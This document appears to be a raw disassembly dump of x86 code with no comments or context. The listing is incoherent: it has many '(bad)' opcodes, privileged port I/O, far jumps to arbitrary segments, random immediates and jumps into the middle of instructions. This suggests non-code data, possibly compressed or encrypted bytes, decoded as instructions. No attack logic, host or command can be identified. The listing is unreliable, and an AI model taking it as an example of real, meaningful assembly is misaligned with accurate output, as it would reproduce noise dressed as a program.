  41e9a0:	test   BYTE PTR [esi],ch
  41e9a2:	stos   DWORD PTR es:[edi],eax
  41e9a3:	mov    edx,DWORD PTR [esi-0x277c7830]
  41e9a9:	rcl    BYTE PTR [edi-0xec1b33b],0x44
  41e9b0:	sqrtps xmm2,XMMWORD PTR [edx]
  41e9b3:	rol    BYTE PTR [edx-0x3ff193a],0x0
  41e9ba:	add    BYTE PTR [eax],al
  41e9bc:	pop    es
  41e9bd:	sbb    cl,BYTE PTR [ecx-0x686462e6]
  41e9c3:	pop    ds
  41e9c4:	xchg   BYTE PTR [ebx],bl
  41e9c6:	mov    edx,0x9aafad0
  41e9cb:	add    DWORD PTR [edx],0x85000167
  41e9d1:	add    al,BYTE PTR [eax]
  41e9d3:	add    bl,dh
  41e9d5:	scas   al,BYTE PTR es:[edi]
  41e9d6:	out    dx,al
  41e9d7:	pushf  
  41e9d8:	rcl    DWORD PTR [eax],cl
  41e9da:	sti    
  41e9db:	xchg   ecx,eax
  41e9dc:	inc    ebp
  41e9dd:	call   0x23d90c69
  41e9e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9e3:	fist   DWORD PTR [esi+eax*1]
  41e9e6:	outs   dx,DWORD PTR ds:[esi]
  41e9e7:	jno    0x41ea60
  41e9e9:	daa    
  41e9ea:	sbb    al,0x3f
  41e9ec:	and    DWORD PTR [esi],ebp
  41e9ee:	in     eax,0xa6
  41e9f0:	or     esp,ebp
  41e9f2:	xchg   edi,eax
  41e9f3:	mov    bl,0x48
  41e9f5:	add    al,0x8b
  41e9f7:	jne    0x41ea77
  41e9f9:	pusha  
  41e9fa:	sub    al,0xd8
  41e9fc:	rcr    ebp,0xe6
  41e9ff:	or     edi,DWORD PTR [edi]
  41ea01:	or     eax,0xd565969b
  41ea06:	nop/reserved BYTE PTR [esi]
  41ea09:	hlt    
  41ea0a:	mov    dl,0x9c
  41ea0c:	loopne 0x41e9bc
  41ea0e:	mov    edx,edx
  41ea10:	jmp    0x9e06:0xb0ee7a45
  41ea17:	mov    ds:0xaff188f5,al
  41ea1c:	push   0xf01ec7e9
  41ea21:	das    
  41ea22:	rcl    ebx,0xb1
  41ea25:	mov    esp,0x9d74a1ad
  41ea2a:	mov    ebx,0x8b2fd642
  41ea2f:	adc    ecx,DWORD PTR [eax-0x7c]
  41ea32:	pop    ds
  41ea33:	fs or  dl,0xa3
  41ea37:	fcomp  DWORD PTR [edx]
  41ea39:	out    dx,al
  41ea3a:	xor    eax,0x1a76af40
  41ea3f:	pop    ecx
  41ea40:	(bad)  
  41ea41:	mov    ss,edx
  41ea43:	jmp    0x41e9e8
  41ea45:	stos   DWORD PTR es:[edi],eax
  41ea46:	sahf   
  41ea47:	rol    DWORD PTR [eax-0x176fd1d5],cl
  41ea4d:	or     al,0x4
  41ea4f:	out    dx,al
  41ea50:	ins    DWORD PTR es:[edi],dx
  41ea51:	dec    edi
  41ea52:	lahf   
  41ea53:	ins    DWORD PTR es:[edi],dx
  41ea54:	test   DWORD PTR [edi-0x32b8063a],ebx
  41ea5a:	mov    ebp,0x7c943444
  41ea5f:	leave  
  41ea60:	imul   DWORD PTR [ebp-0x5e36cbb8]
  41ea66:	sub    dh,BYTE PTR [eax-0x3aeb3d51]
  41ea6c:	retf   
  41ea6d:	or     al,BYTE PTR [ecx+0x29]
  41ea70:	pop    ebp
  41ea71:	outs   dx,DWORD PTR ds:[esi]
  41ea72:	inc    ebx
  41ea73:	scas   eax,DWORD PTR es:[edi]
  41ea74:	dec    edx
  41ea75:	cwde   
  41ea76:	sbb    eax,0x17351168
  41ea7b:	rcr    BYTE PTR [ebp-0x3f],0xa3
  41ea7f:	push   ds
  41ea80:	sbb    al,0x3c
  41ea82:	mov    ebp,0xa682f1bf
  41ea87:	in     al,dx
  41ea88:	sub    al,0x27
  41ea8a:	ins    BYTE PTR es:[edi],dx
  41ea8b:	jae    0x41eaf5
  41ea8d:	shr    DWORD PTR ds:0x8208256d,cl
  41ea93:	push   0x12b36e04
  41ea98:	push   eax
  41ea99:	and    cl,BYTE PTR [ecx+0x40ebe08f]
  41ea9f:	jp     0x41ea59
  41eaa1:	dec    edx
  41eaa2:	retf   
  41eaa3:	adc    edx,esp
  41eaa5:	popa   
  41eaa6:	xor    bh,dh
  41eaa8:	idiv   DWORD PTR [edx]
  41eaaa:	and    al,0x1
  41eaac:	imul   ebx,DWORD PTR [edi-0x5931515d],0xf7bc7983
  41eab6:	imul   esp,DWORD PTR [ebx+0x7149afa3],0x13bceed7
  41eac0:	mov    DWORD PTR [ecx+0x4b424726],edi
  41eac6:	in     al,0x54
  41eac8:	ret    0xfa28
  41eacb:	test   BYTE PTR [edi-0x29c525f1],cl
  41ead1:	mov    ds:0xcae23198,eax
  41ead6:	(bad)  
  41ead7:	fnstsw WORD PTR [ecx]
  41ead9:	retf   
  41eada:	das    
  41eadb:	pusha  
  41eadc:	les    ebp,FWORD PTR [esi]
  41eade:	test   DWORD PTR ds:0x7313544,edx
  41eae4:	add    DWORD PTR [edi+0x7f6e41dc],esp
  41eaea:	mov    ds:0xcc013f0d,eax
  41eaef:	sbb    DWORD PTR ds:0x37bc0e86,ebp
  41eaf5:	and    DWORD PTR [edi-0x142f308],edi
  41eafb:	aas    
  41eafc:	jns    0x41eb6d
  41eafe:	scas   al,BYTE PTR es:[edi]
  41eaff:	pop    ecx
  41eb00:	cmp    al,0xb8
  41eb02:	sub    al,0xba
  41eb04:	call   0xe790:0x2f968bc1
  41eb0b:	xor    ebp,eax
  41eb0d:	out    dx,eax
  41eb0e:	mov    bl,0x67
  41eb10:	out    0x8a,al
  41eb12:	dec    ebx
  41eb13:	and    BYTE PTR [edi-0x19],dl
  41eb16:	mov    ebp,0x27660ee5
  41eb1b:	cmc    
  41eb1c:	fwait
  41eb1d:	mov    ebp,0x1977848f
  41eb22:	xchg   ebp,eax
  41eb23:	aaa    
  41eb24:	test   ebx,0xa96964
  41eb2a:	(bad)  
  41eb2b:	clc    
  41eb2c:	mov    edi,0xaabacc3
  41eb31:	int    0xd9
  41eb33:	enter  0x399d,0x71
  41eb37:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eb38:	pop    ecx
  41eb39:	or     eax,0x94f0a978
  41eb3e:	pusha  
  41eb3f:	push   0xffffffa6
  41eb41:	hlt    
  41eb42:	or     BYTE PTR [eax-0xb5afa82],0xe7
  41eb49:	jmp    0x41eb3a
  41eb4b:	push   eax
  41eb4c:	int    0xc8
  41eb4e:	jp     0x41eb3b
  41eb50:	adc    bh,bh
  41eb52:	mov    dh,0x60
  41eb54:	outs   dx,DWORD PTR ds:[esi]
  41eb55:	dec    ebx
  41eb56:	dec    ebp
  41eb57:	dec    ebx
  41eb58:	jo     0x41eb99
  41eb5a:	imul   eax,DWORD PTR [ecx-0x30],0xffffffc5
  41eb5e:	mov    eax,ds:0x92371399
  41eb63:	sub    al,0x9a
  41eb65:	stos   DWORD PTR es:[edi],eax
  41eb66:	lea    esp,[ecx+0x124b56cf]
  41eb6c:	inc    esi
  41eb6d:	popa   
  41eb6e:	call   FWORD PTR [esp+edx*2-0x75c58cc0]
  41eb75:	mov    eax,ds:0xf429383d
  41eb7a:	cli    
  41eb7b:	div    esi
  41eb7d:	mov    esi,0xc45a1151
  41eb82:	arpl   WORD PTR [esi-0x6e],ax
  41eb85:	arpl   WORD PTR [ecx],cx
  41eb87:	fistp  QWORD PTR ds:0xa586a0e8
  41eb8d:	and    esp,DWORD PTR [edx-0x39e8e832]
  41eb93:	mov    bh,0x1d
  41eb95:	and    dl,cl
  41eb97:	stc    
  41eb98:	cld    
  41eb99:	mul    DWORD PTR [eax]
  41eb9b:	mov    eax,0x5ba4df41
  41eba0:	cmp    DWORD PTR [ebp-0x22468435],esi
  41eba6:	push   ebx
  41eba7:	mov    edx,0x57511242
  41ebac:	dec    ebp
  41ebad:	jmp    FWORD PTR [esi-0x1824ba93]
  41ebb3:	mov    eax,0x854adb17
  41ebb8:	in     al,0xd3
  41ebba:	shr    BYTE PTR [edx-0x71],1
  41ebbd:	pop    edi
  41ebbe:	fldenv [esi]
  41ebc0:	ss and al,0xf9
  41ebc3:	mov    esp,DWORD PTR [ecx]
  41ebc5:	xchg   ebx,eax
  41ebc6:	lods   al,BYTE PTR ds:[esi]
  41ebc7:	shl    DWORD PTR [edx+0x1e],0xca
  41ebcb:	popf   
  41ebcc:	push   es
  41ebcd:	test   BYTE PTR [edi-0xb4f3c02],dl
  41ebd3:	shld   DWORD PTR [ebx-0x1e],esi,0x32
  41ebd8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebd9:	lods   eax,DWORD PTR ds:[esi]
  41ebda:	cmp    DWORD PTR [ebx-0x7bab564a],ebp
  41ebe0:	pop    es
  41ebe1:	jnp    0x41ec2d
  41ebe3:	es xchg ebp,eax
  41ebe5:	pushf  
  41ebe6:	repnz cdq 
  41ebe8:	add    ecx,ebp
  41ebea:	xor    al,0x9d
  41ebec:	in     al,0xd7
  41ebee:	pop    edx
  41ebef:	adc    eax,0x61a24ada
  41ebf4:	jne    0x41eb7a
  41ebf6:	xchg   edx,eax
  41ebf7:	cmc    
  41ebf8:	cmp    bh,BYTE PTR [ecx+0x1052c225]
  41ebfe:	mov    ebx,0x2a25c641
  41ec03:	add    edx,0xa
  41ec06:	imul   ebx,DWORD PTR [ecx+0x20],0x39afa510
  41ec0d:	outs   dx,BYTE PTR ds:[esi]
  41ec0e:	ins    BYTE PTR es:[edi],dx
  41ec0f:	out    0x2f,al
  41ec11:	ja     0x41eba9
  41ec13:	imul   ecx,DWORD PTR [edi],0xffffffb4
  41ec16:	dec    ecx
  41ec17:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec18:	sbb    eax,0xcdeb2738
  41ec1d:	leave  
  41ec1e:	add    eax,0x9d52f991
  41ec23:	shr    DWORD PTR [edx+0x19f87904],cl
  41ec29:	(bad)  
  41ec2a:	jle    0x41ec2e
  41ec2c:	mov    WORD PTR [eax-0x576323b5],fs
  41ec32:	add    ecx,edx
  41ec34:	add    DWORD PTR [edx],ebp
  41ec36:	mov    bl,0x47
  41ec38:	mov    dh,dl
  41ec3a:	pusha  
  41ec3b:	mov    WORD PTR [ecx+eax*1-0x1adb2548],cs
  41ec42:	cmc    
  41ec43:	mov    ds:0xe0b0478c,eax
  41ec48:	pop    es
  41ec49:	sbb    bh,BYTE PTR [eax+ebx*1]
  41ec4c:	inc    esi
  41ec4d:	or     DWORD PTR [esi+0x62],esp
  41ec50:	loopne 0x41ec48
  41ec52:	popa   
  41ec53:	mov    ebx,0x2232a47a
  41ec58:	fld    DWORD PTR [eax]
  41ec5a:	add    BYTE PTR [eax],al
  41ec5c:	push   ds
  41ec5d:	add    al,0xa7
  41ec5f:	(bad)  
  41ec60:	mov    edi,0xf6dd7ee7
  41ec65:	jp     0x41ec30
  41ec67:	push   esi
  41ec68:	stos   BYTE PTR es:[edi],al
  41ec69:	cs cs mov eax,0x16987
  41ec70:	test   DWORD PTR [edx],eax
  41ec72:	add    BYTE PTR [eax],al
  41ec74:	push   edx
  41ec75:	ret    
  41ec76:	xchg   ecx,eax
  41ec77:	or     al,ch
  41ec79:	dec    ebx
  41ec7a:	jmp    0x41ec0e
  41ec7c:	hlt    
  41ec7d:	mov    edx,0x9213ca40
  41ec82:	not    DWORD PTR [esi]
  41ec84:	sub    DWORD PTR [esi],ebx
  41ec86:	xor    al,0x7d
  41ec88:	jne    0x41ec68
  41ec8a:	icebp  
  41ec8b:	hlt    
  41ec8c:	sar    DWORD PTR [ebp+0x58be2ad3],1
  41ec92:	pop    ds
  41ec93:	sahf   
  41ec94:	sahf   
  41ec95:	inc    edi
  41ec96:	lea    eax,[edi-0x7fb9baf]
  41ec9c:	in     al,dx
  41ec9d:	pop    edx
  41ec9e:	jg     0x41ecb0
  41eca0:	jecxz  0x41ec41
  41eca2:	push   edi
  41eca3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eca4:	rcl    DWORD PTR [ebx],0x97
  41eca7:	cmp    al,BYTE PTR [ebp+0x7b]
  41ecaa:	sub    al,BYTE PTR [ecx-0x2015e2c4]
  41ecb0:	dec    edi
  41ecb1:	sbb    eax,0xb598c113
  41ecb6:	pop    edi
  41ecb7:	outs   dx,BYTE PTR ds:[esi]
  41ecb8:	in     eax,dx
  41ecb9:	iret   
  41ecba:	add    BYTE PTR [ecx-0x33591bee],al
  41ecc0:	or     dl,0x5
  41ecc3:	push   ebx
  41ecc4:	cdq    
  41ecc5:	int    0xa9
  41ecc7:	mov    DWORD PTR [edx+edx*4],esp
  41ecca:	jmp    0x41ecd8
  41eccc:	inc    edi
  41eccd:	dec    ebx
  41ecce:	fsub   QWORD PTR [edi]
  41ecd0:	sar    BYTE PTR [ebp+0x49],1
  41ecd3:	pop    edi
  41ecd4:	push   ss
  41ecd5:	fist   DWORD PTR [esi-0x49]
  41ecd8:	sub    eax,0x2b54ff6d
  41ecdd:	xor    BYTE PTR fs:[edx-0x37a6233],0xa1
  41ece5:	out    0x1c,eax
  41ece7:	sub    eax,0xd6d6e371
  41ecec:	and    DWORD PTR [edi-0x61],0xffffffab
  41ecf0:	xchg   BYTE PTR [esi+edi*1-0x66],cl
  41ecf4:	cmovp  ebx,DWORD PTR [edx+0x7d]
  41ecf8:	and    al,0x55
  41ecfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ecfb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ecfc:	sub    ah,BYTE PTR [esi-0x663cba6b]
  41ed02:	fmul   st(7),st
  41ed04:	mov    esp,0xcce3ead8
  41ed09:	cmp    al,0x26
  41ed0b:	in     eax,dx
  41ed0c:	mov    ecx,0x50258a7
  41ed11:	pop    eax
  41ed12:	aad    0xf3
  41ed14:	sbb    BYTE PTR ds:0xde09d202,al
  41ed1a:	sbb    BYTE PTR [esp+edx*8],bl
  41ed1d:	add    DWORD PTR [ebx-0x71fa6fb7],ebx
  41ed23:	sub    DWORD PTR [ebx],edi
  41ed25:	leave  
  41ed26:	lods   al,BYTE PTR ds:[esi]
  41ed27:	mov    ecx,0x66246ae4
  41ed2c:	push   ebx
  41ed2d:	sub    BYTE PTR [esi-0x93caff2],ch
  41ed33:	sub    al,0xd4
  41ed35:	and    dh,BYTE PTR fs:[edi-0x3f]
  41ed39:	add    ch,dl
  41ed3b:	push   esp
  41ed3c:	add    eax,0xb8a38e61
  41ed41:	into   
  41ed42:	ret    0xe89
  41ed45:	mov    edx,0xad0f6fff
  41ed4a:	lods   al,BYTE PTR ds:[esi]
  41ed4b:	fst    DWORD PTR [esi+0x27e0fc4]
  41ed51:	mov    DWORD PTR [eax+0x16bc8f0],esi
  41ed57:	jnp    0x41edb5
  41ed59:	fisttp QWORD PTR [ecx]
  41ed5b:	or     eax,0xe2275c59
  41ed60:	xchg   BYTE PTR [esi-0x62cc2a35],bh
  41ed66:	inc    edx
  41ed67:	push   0x565bf425
  41ed6c:	icebp  
  41ed6d:	sbb    eax,0xa66f6b4b
  41ed72:	mov    bh,BYTE PTR [ebx+eax*1+0x7f460fec]
  41ed79:	test   eax,0x1c1931ab
  41ed7e:	sub    edi,DWORD PTR [eax-0xd]
  41ed81:	fadd   st(4),st
  41ed83:	repz inc edx
  41ed85:	int3   
  41ed86:	and    al,0xad
  41ed88:	dec    esi
  41ed89:	iret   
  41ed8a:	jae    0x41ed96
  41ed8c:	icebp  
  41ed8d:	arpl   WORD PTR [ecx-0x27],cx
  41ed90:	stc    
  41ed91:	pusha  
  41ed92:	mov    edi,0xa23015cf
  41ed97:	(bad)  
  41ed99:	int3   
  41ed9a:	dec    esi
  41ed9b:	fiadd  WORD PTR [edi]
  41ed9d:	dec    ebx
  41ed9e:	xchg   DWORD PTR [ecx-0x4c465841],edi
  41eda4:	xor    ch,cl
  41eda6:	mov    ebx,0xd800713d
  41edab:	into   
  41edac:	adc    al,0x8b
  41edae:	dec    ebx
  41edaf:	(bad)  
  41edb0:	mov    esp,0x5bbded8
  41edb5:	jno    0x41edfa
  41edb7:	mov    esi,0x9724501a
  41edbc:	pop    esp
  41edbd:	test   bh,0x9f
  41edc0:	inc    edx
  41edc1:	push   ecx
  41edc2:	adc    DWORD PTR cs:[ebp-0x7b],ecx
  41edc6:	retf   0x8cfb
  41edc9:	stos   BYTE PTR es:[edi],al
  41edca:	xchg   edi,eax
  41edcb:	retf   
  41edcc:	mov    al,0xb1
  41edce:	dec    ecx
  41edcf:	push   eax
  41edd0:	push   ebx
  41edd1:	xchg   DWORD PTR [ebx+0x6f15c1a4],ebx
  41edd7:	jbe    0x41ed63
  41edd9:	mov    ecx,0xc6f7b445
  41edde:	dec    eax
  41eddf:	mov    ecx,edi
  41ede1:	xor    DWORD PTR [edi-0x5c],edx
  41ede4:	loop   0x41ee3e
  41ede6:	and    BYTE PTR [edx-0x3ef6082b],dh
  41edec:	popa   
  41eded:	push   ss
  41edee:	stc    
  41edef:	int3   
  41edf0:	add    ebx,ecx
  41edf2:	lods   eax,DWORD PTR ds:[esi]
  41edf3:	neg    BYTE PTR [ebx-0x63051618]
  41edf9:	and    ecx,DWORD PTR [eax]
  41edfb:	mov    ds:0xee5e4f9d,eax
  41ee00:	lds    ebp,FWORD PTR [ebx-0x19181484]
  41ee06:	mov    ah,0x70
  41ee08:	jae    0x41ed9d
  41ee0a:	fisub  WORD PTR [ebp-0x5e]
  41ee0d:	scas   al,BYTE PTR es:[edi]
  41ee0e:	rcl    DWORD PTR [ebp-0x6c],cl
  41ee11:	retf   
  41ee12:	lds    esp,FWORD PTR [ebp-0x3d]
  41ee15:	jmp    0x8bf9:0x28e4f6ff
  41ee1c:	add    bl,BYTE PTR [ecx]
  41ee1e:	fwait
  41ee1f:	lods   al,BYTE PTR ds:[esi]
  41ee20:	pop    esi
  41ee21:	popa   
  41ee22:	sahf   
  41ee23:	neg    DWORD PTR [ebp+0x4afa9984]
  41ee29:	arpl   WORD PTR [bx+si-0x4],ax
  41ee2d:	in     eax,dx
  41ee2e:	add    ah,BYTE PTR [ebx+0x40]
  41ee31:	scas   eax,DWORD PTR es:[edi]
  41ee32:	je     0x41edee
  41ee34:	out    0xf5,al
  41ee36:	xor    BYTE PTR [eax-0x3136a30b],0xc6
  41ee3d:	retf   0x3b2b
  41ee40:	xchg   DWORD PTR [eax],esp
  41ee42:	call   0x3869c203
  41ee47:	jnp    0x41ee0f
  41ee49:	fdivr  st,st(7)
  41ee4b:	jl     0x41edd6
  41ee4d:	ins    BYTE PTR es:[edi],dx
  41ee4e:	test   BYTE PTR [edx+0x69],dl
  41ee51:	pop    edi
  41ee52:	mov    ebx,0x10d18bbf
  41ee57:	push   eax
  41ee58:	jge    0x41ee89
  41ee5a:	sti    
  41ee5b:	(bad)  
  41ee5d:	idiv   BYTE PTR ds:0xdcaf4edc
  41ee63:	cwde   
  41ee64:	or     DWORD PTR [ebx+eax*1-0xc],ebp
  41ee68:	ds xchg edi,eax
  41ee6a:	lods   al,BYTE PTR ds:[esi]
  41ee6b:	cmovo  esi,DWORD PTR ds:0xba75a572
  41ee72:	mov    dl,BYTE PTR [esi-0x620e92a6]
  41ee78:	xor    cl,dl
  41ee7a:	fisubr WORD PTR [edi-0x46022d01]
  41ee80:	ins    DWORD PTR es:[edi],dx
  41ee81:	xchg   ecx,eax
  41ee82:	bound  eax,QWORD PTR [edi+0x42e5b341]
  41ee88:	or     BYTE PTR [ecx-0x6c],dl
  41ee8b:	fistp  QWORD PTR [edx+0x479a36cd]
  41ee91:	sahf   
  41ee92:	shl    DWORD PTR [eax],1
  41ee94:	fstp   TBYTE PTR [ecx+0xb]
  41ee97:	inc    ecx
  41ee98:	mov    al,0xae
  41ee9a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee9b:	push   cs
  41ee9c:	pop    edx
  41ee9d:	fcomp  QWORD PTR [eax+0x25297224]
  41eea3:	ja     0x41eea0
  41eea5:	int3   
  41eea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41eea7:	fadd   st(2),st
  41eea9:	mov    edi,0x8d4607d6
  41eeae:	jle    0x41ee64
  41eeb0:	push   esp
  41eeb1:	jbe    0x41ee85
  41eeb3:	xor    ebx,edi
  41eeb5:	aas    
  41eeb6:	jb     0x41ef1a
  41eeb8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eeb9:	(bad)  
  41eeba:	dec    edx
  41eebb:	push   edi
  41eebc:	out    0xd,al
  41eebe:	ret    0xc5dd
  41eec1:	out    0x60,al
  41eec3:	sbb    al,0x1b
  41eec5:	sar    DWORD PTR [ebx],1
  41eec7:	adc    BYTE PTR [edi+0x2],ah
  41eeca:	imul   ebp,ecx,0xffffffd7
  41eecd:	mov    ?,WORD PTR [edi-0x53e074b8]
  41eed3:	inc    edi
  41eed4:	add    DWORD PTR [edi+0x1610fcba],ebx
  41eeda:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eedb:	jle    0x41ee7a
  41eedd:	pop    ecx
  41eede:	popf   
  41eedf:	dec    esp
  41eee0:	pusha  
  41eee1:	or     eax,DWORD PTR [eax+0x53b99fdd]
  41eee7:	scas   al,BYTE PTR es:[edi]
  41eee8:	(bad)
  41eeec:	add    BYTE PTR [ebx-0x7bb9ef42],cl
  41eef2:	add    al,BYTE PTR [edi]
  41eef4:	mov    ecx,0xf4002ff9
  41eef9:	add    BYTE PTR [eax],al
  41eefb:	add    BYTE PTR [eax-0x77],bh
  41eefe:	hlt    
  41eeff:	mov    al,0xf5
  41ef01:	std    
  41ef02:	jl     0x41eecd
  41ef04:	dec    edi
  41ef05:	pop    ds
  41ef06:	cmp    DWORD PTR [ebx-0x21],ebp
  41ef09:	jns    0x41eeaa
  41ef0b:	daa    
  41ef0c:	or     al,0x6c
  41ef0e:	add    DWORD PTR [eax],eax
  41ef10:	test   DWORD PTR [edx],eax
  41ef12:	add    BYTE PTR [eax],al
  41ef14:	and    al,0x58
  41ef16:	(bad)  
  41ef17:	out    0xc5,eax
  41ef19:	gs out dx,eax
  41ef1b:	icebp  
  41ef1c:	mov    edx,edx
  41ef1e:	push   ss
  41ef1f:	mov    ebx,0xebf7cf1
  41ef24:	mov    ebx,0x40b5e1ea
  41ef29:	adc    DWORD PTR [ebp-0x48cdf65],esp
  41ef2f:	inc    BYTE PTR [ebp*2-0x621164b]
  41ef36:	in     al,dx
  41ef37:	push   esp
  41ef38:	and    ch,BYTE PTR [ebx+0x1fc8d5b6]
  41ef3e:	jle    0x41eedf
  41ef40:	xchg   ecx,eax
  41ef41:	pop    eax
  41ef42:	jb     0x41ef63
  41ef44:	int3   
  41ef45:	loope  0x41ef5e
  41ef47:	xchg   esp,eax
  41ef48:	loopne 0x41eef1
  41ef4a:	(bad)  
  41ef4b:	push   edi
  41ef4c:	mov    esp,edx
  41ef4e:	(bad)  
  41ef4f:	icebp  
  41ef50:	xchg   BYTE PTR [ebx],dl
  41ef52:	mov    dl,0x95
  41ef54:	pop    ebx
  41ef55:	dec    ebp
  41ef56:	mov    ds:0x7ad2cec3,al
  41ef5b:	fild   QWORD PTR [ecx+0x43]
  41ef5e:	push   edi
  41ef5f:	inc    eax
  41ef60:	inc    ebp
  41ef61:	mov    ebp,0xce391c72
  41ef66:	push   0xadf44d67
  41ef6b:	bnd jnp 0x41ef3f
  41ef6e:	(bad)  
  41ef6f:	dec    DWORD PTR [edi+0x33]
  41ef72:	mov    esi,eax
  41ef74:	imul   edx,DWORD PTR [ebx+0x14],0x3d5a91a8
  41ef7b:	inc    eax
  41ef7c:	and    bl,BYTE PTR [ecx-0x7da97d89]
  41ef82:	dec    edx
  41ef83:	mov    ecx,0xb0373e76
  41ef88:	mov    esi,0x56f7c34f
  41ef8d:	fmulp  st(7),st
  41ef8f:	test   BYTE PTR [edi-0x19],bl
  41ef92:	mov    esp,0x3d392454
  41ef97:	out    dx,eax
  41ef98:	jb     0x41ef1e
  41ef9a:	mov    cl,BYTE PTR [edx]
  41ef9c:	xchg   edx,eax
  41ef9d:	lahf   
  41ef9e:	inc    bx
  41efa0:	test   eax,0x6cfa10e1
  41efa5:	gs (bad) 
  41efa7:	clc    
  41efa8:	jo     0x41ef50
  41efaa:	sbb    al,0xa3
  41efac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41efad:	test   BYTE PTR [esi+ecx*1-0x2d0e47bf],ah
  41efb4:	jne    0x41effe
  41efb6:	jmp    0xd8801f83
  41efbb:	adc    dl,BYTE PTR [ebp+eax*2-0x57]
  41efbf:	ds push 0xd4d486a8
  41efc5:	pop    ebp
  41efc6:	adc    edx,DWORD PTR [ebx-0xa]
  41efc9:	fld    st(7)
  41efcb:	ss or  ah,al
  41efce:	out    dx,eax
  41efcf:	and    ecx,DWORD PTR [esi+eiz*2-0x3cb16609]
  41efd6:	cmp    eax,edx
  41efd8:	or     dh,ah
  41efda:	xor    DWORD PTR [eax-0x6acd7b9c],eax
  41efe0:	cld    
  41efe1:	mov    ebx,ebp
  41efe3:	fwait
  41efe4:	sub    al,0x92
  41efe6:	sub    eax,0xc8f975ba
  41efeb:	add    al,0x18
  41efed:	iret   
  41efee:	or     DWORD PTR [edx-0xd],0xfafac84e
  41eff5:	enter  0xa614,0xfe
  41eff9:	cld    
  41effa:	lock jnp 0x41efda
  41effd:	sti    
  41effe:	dec    esp
  41efff:	adc    BYTE PTR [eax],cl
  41f001:	test   DWORD PTR [edx],esi
  41f003:	mov    ebp,0xee6279f4
  41f008:	ficom  WORD PTR [edx+0x145c5126]
  41f00e:	lds    edx,FWORD PTR [esi-0x44]
  41f011:	(bad)  
  41f012:	fcomp  QWORD PTR [eax+edi*8-0x63]
  41f016:	and    DWORD PTR [ebx+0x45e43cc6],0xffffff8c
  41f01d:	pop    edi
  41f01e:	add    ah,al
  41f020:	data16 rcl BYTE PTR [eax-0x54],cl
  41f024:	mov    ch,0x3
  41f026:	shl    bl,1
  41f028:	rol    DWORD PTR ds:0x70a6a7c1,0x40
  41f02f:	mov    bl,0x97
  41f031:	ins    DWORD PTR es:[edi],dx
  41f032:	pop    edi
  41f033:	inc    esp
  41f034:	pop    eax
  41f035:	rcr    BYTE PTR [esi],cl
  41f037:	das    
  41f038:	mov    al,BYTE PTR [ecx+0xe]
  41f03b:	jp     0x41f038
  41f03d:	mov    al,0xd6
  41f03f:	call   0xbafb5a4
  41f044:	inc    ebp
  41f045:	pushf  
  41f046:	sub    al,0xde
  41f048:	pop    esi
  41f049:	push   0x7f
  41f04b:	push   edi
  41f04c:	aad    0xbd
  41f04e:	call   0x527:0x9502fd53
  41f055:	lea    edx,[esi+0x29]
  41f058:	(bad)  
  41f059:	cmc    
  41f05a:	dec    esp
  41f05b:	cwde   
  41f05c:	sar    DWORD PTR [ecx+0x2de12e9c],cl
  41f062:	jno    0x41f028
  41f064:	fldz   
  41f066:	sbb    eax,0x6c9b331b
  41f06b:	mul    BYTE PTR [esi]
  41f06d:	pop    edx
  41f06e:	mov    dh,bh
  41f070:	mov    ecx,0xe48088a9
  41f075:	mov    eax,0xd7d13445
  41f07a:	cli    
  41f07b:	cli    
  41f07c:	iret   
  41f07d:	call   0x3fbe217
  41f082:	(bad)  
  41f083:	xor    eax,0xa32d98fc
  41f088:	and    edi,DWORD PTR [esi+0x3d]
  41f08b:	add    ah,BYTE PTR [ebx+0x4e1d0f86]
  41f091:	icebp  
  41f092:	xor    ebx,esp
  41f094:	cli    
  41f095:	cmp    BYTE PTR [ebx-0x4ee72db1],0x53
  41f09c:	mov    edi,ebx
  41f09e:	sub    dh,BYTE PTR [ecx]
  41f0a0:	mov    DWORD PTR [edx-0x4bf9c5d5],esi
  41f0a6:	mov    ecx,0xe719ff79
  41f0ab:	push   0x65
  41f0ad:	cli    
  41f0ae:	and    al,0x7d
  41f0b0:	imul   esp,esp,0x30a846cc
  41f0b6:	xchg   esp,eax
  41f0b7:	lods   al,BYTE PTR ds:[esi]
  41f0b8:	push   cs
  41f0b9:	rcl    DWORD PTR [ebp-0x21b19c99],1
  41f0bf:	sti    
  41f0c0:	je     0x41f0bd
  41f0c2:	inc    esp
  41f0c3:	ins    BYTE PTR es:[edi],dx
  41f0c4:	adc    edx,ecx
  41f0c6:	repnz imul esi,DWORD PTR [ecx-0x21215a11],0x16
  41f0ce:	in     al,dx
  41f0cf:	jp     0x41f07e
  41f0d1:	fwait
  41f0d2:	popf   
  41f0d3:	popf   
  41f0d4:	cmp    al,0xcb
  41f0d6:	int3   
  41f0d7:	adc    ebp,DWORD PTR [edx+0x2f]
  41f0da:	out    0x5f,eax
  41f0dc:	scas   eax,DWORD PTR es:[edi]
  41f0dd:	mov    ds:0x70619a70,al
  41f0e2:	pop    edx
  41f0e3:	xchg   esp,eax
  41f0e4:	lea    edx,[edi]
  41f0e6:	xlat   BYTE PTR ds:[ebx]
  41f0e7:	shl    BYTE PTR [ecx-0x2e],1
  41f0ea:	out    0x8c,eax
  41f0ec:	sub    DWORD PTR [esi+0x38],edx
  41f0ef:	mul    ebx
  41f0f1:	jmp    0x41f0d8
  41f0f3:	in     al,0x28
  41f0f5:	popa   
  41f0f6:	out    dx,al
  41f0f7:	cdq    
  41f0f8:	cmp    DWORD PTR [edx+0x3c],ebp
  41f0fb:	pusha  
  41f0fc:	inc    eax
  41f0fd:	popf   
  41f0fe:	jns    0x41f153
  41f100:	sbb    bh,ch
  41f102:	and    dh,cl
  41f104:	jno    0x41f17d
  41f106:	iret   
  41f107:	sub    ah,bh
  41f109:	out    dx,al
  41f10a:	adc    al,0x2e
  41f10c:	xchg   ecx,eax
  41f10d:	cmp    eax,0xd5a5477f
  41f112:	hlt    
  41f113:	lahf   
